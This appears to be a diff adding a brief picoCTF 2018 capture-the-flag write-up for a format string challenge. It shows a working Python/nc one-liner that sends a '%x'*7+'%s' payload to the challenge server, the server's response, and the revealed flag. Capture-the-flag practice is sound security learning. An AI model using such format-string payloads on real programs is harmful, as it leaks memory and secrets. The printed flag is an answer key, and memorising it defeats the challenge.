@@ -1,0 +1,9 @@
+This program is vulnerable to a format string attack, which we can easily exploit by
+brute forcing the offset required to access the flag, then print the entire thing as a string.
+Turns out this offset is 7.
+
+$ python -c "print '%x'*7+'%s'" | nc 2018shell3.picoctf.com 57169
+Time to learn about Format Strings!
+We will evaluate any format string you give us with printf().
+See if you can get the flag!
+> 40f773e5a08048647f7775a741f774d490ffd85194picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
